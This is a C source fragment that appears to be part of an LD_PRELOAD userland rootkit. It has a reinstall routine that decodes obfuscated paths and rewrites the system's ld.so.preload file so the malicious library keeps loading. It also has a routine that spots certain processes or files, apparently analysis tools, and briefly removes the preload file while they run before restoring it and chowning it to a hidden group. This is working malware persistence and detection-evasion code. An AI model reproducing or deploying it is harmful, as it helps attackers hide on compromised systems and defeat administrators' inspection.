void reinstall(void)
{   
    HOOK(o_xstat, C__XSTAT);
    HOOK(o_access, CACCESS);
    HOOK(o_chown,CCHOWN);

    FILE *preload;
    struct stat s_fstat;

    char *sopath=strdup(SOPATH), *ldsp=strdup(LDSO_PRELOAD); xor(sopath); xor(ldsp);
    memset(&s_fstat, 0, sizeof(stat));
    o_xstat(_STAT_VER, ldsp, &s_fstat);
    if(s_fstat.st_size != strlen(sopath) || o_access(ldsp, F_OK) == -1)
    {
        HOOK(o_fopen,CFOPEN);
        if((preload=o_fopen(ldsp,"w")))
        {
            HOOK(o_fwrite,CFWRITE);
            o_fwrite(sopath, strlen(sopath), 1, preload);
            fflush(preload); fclose(preload);
        }
    }
    CLEAN(sopath);
    CLEAN(ldsp);
}

int hbdvl(const char *filename, const char *proc, int ret)
{
    char *cproc=cprocname(), fnm_proc[64];
    snprintf(fnm_proc, sizeof(fnm_proc), "*/%s", proc);

    if(strstr(cproc, proc) || strstr(filename, proc) || !fnmatch(fnm_proc, filename, FNM_PATHNAME) || getenv(proc))
    {
        if(getuid() != 0 && geteuid() != 0) return 0;

        HOOK(o_unlink,CUNLINK);
        char *ldsp=strdup(LDSO_PRELOAD); xor(ldsp);
        o_unlink(ldsp);

        int pid;
        if((pid = fork()) == -1) return -1;
        else if(pid == 0) return 2;

        wait(&ret);
        reinstall();
        if(!hxstat(ldsp,MGID,32)) o_chown(ldsp,MGID,MGID);
        CLEAN(ldsp);
        return 1;
    }
    return 3;
}
